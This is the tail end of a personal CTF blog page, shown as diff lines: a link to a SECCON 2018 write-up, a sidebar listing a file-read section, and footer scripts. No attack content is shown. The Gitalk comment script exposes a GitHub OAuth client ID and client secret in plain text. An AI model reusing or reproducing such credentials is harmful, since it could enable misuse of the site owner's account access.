+      Seccon2018 GhostKingdom Writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Baby-Cake"><span class="nav-number">1.</span> <span class="nav-text">Baby Cake</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#本地任意文件读取"><span class="nav-number">1.1.</span> <span class="nav-text">本地任意文件读取</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Srpopty</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Srpopty</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,255' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'fb9b672afa74e328fbe8',
+      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
+      repo        : 'srpopty.github.io',
+      owner       : 'Srpopty',
+      admin       : ['Srpopty'],
+      id          : '0948271c8ac03efc2bd0180210bb0228',
+        language: 'en',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
